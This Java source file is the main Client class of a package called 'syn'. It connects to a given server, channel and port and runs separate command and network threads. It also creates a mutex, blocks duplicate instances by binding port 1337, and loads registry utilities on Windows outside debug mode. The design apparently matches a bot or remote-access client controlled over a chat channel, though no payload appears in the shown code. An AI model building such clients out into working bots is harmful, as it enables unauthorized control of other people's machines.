package syn.main;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.SocketException;

import syn.net.NetworkThread;
import syn.utils.FileUtils;
import syn.utils.Settings;
import syn.utils.mutex.Mutex;
import syn.utils.reg.RegUtils;

@SuppressWarnings("unused")
public class Client {
	
	private Mutex mu;
	private RegUtils ru;
	private static FileUtils fu;
	private static NetworkThread nt;
	private static CmdThread cmd;
	public static ServerSocket dupePrevent;
	public static boolean connected = false;
	public static String os;
	
	public Client(String server, String channel, int port) {
		checkLockSock();
		Utilities uc = new Utilities();
		os = System.getProperty("os.name");
		mu = new Mutex();
		if(uc.procOS(os).equals("WIN")) {
			if(!Settings.debugMode) {
				ru = new RegUtils();
				fu = new FileUtils();
			}
		}
		try {
			//Make Command Thread
			cmd = new CmdThread();
			Thread cmdth = new Thread(cmd);
			cmdth.start();
			
			//Make Network Thread
			nt = new NetworkThread(server, channel, port);
			Thread nth = new Thread(nt);
			nth.start();
		} catch (Exception e) { e.printStackTrace(); }
	}
	
	private void checkLockSock() {
		try {
			dupePrevent = new ServerSocket();
			dupePrevent.bind(new InetSocketAddress(1337));
		} catch (SocketException e) { System.exit(0); } catch (IOException e) {}
	}

	public static FileUtils getFileUtils() {
		return fu;
	}
	
	public static NetworkThread getNetworkThread() {
		return nt;
	}
	
	public static CmdThread getCmdThread() {
		return cmd;
	}
}